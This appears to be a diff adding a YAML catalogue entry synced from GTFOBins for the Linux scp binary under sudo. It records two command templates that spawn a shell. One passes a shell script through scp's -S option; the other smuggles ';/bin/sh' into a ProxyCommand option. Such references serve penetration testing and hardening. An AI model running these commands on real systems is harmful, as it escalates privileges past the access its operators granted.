@@ -1,0 +1,29 @@
+id: gtfobins/scp/shell/sudo
+type: binary
+platform: linux
+name: scp
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''exec /bin/sh 0<&2 1>&2'' >/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    scp -S /path/to/temp-file x x:'
+- template: 'scp -o ''ProxyCommand=;/bin/sh 0<&2 1>&2'' x x:'
+references:
+- https://gtfobins.github.io/gtfobins/scp/
+tags:
+- linux
+- unix
+- gtfobins
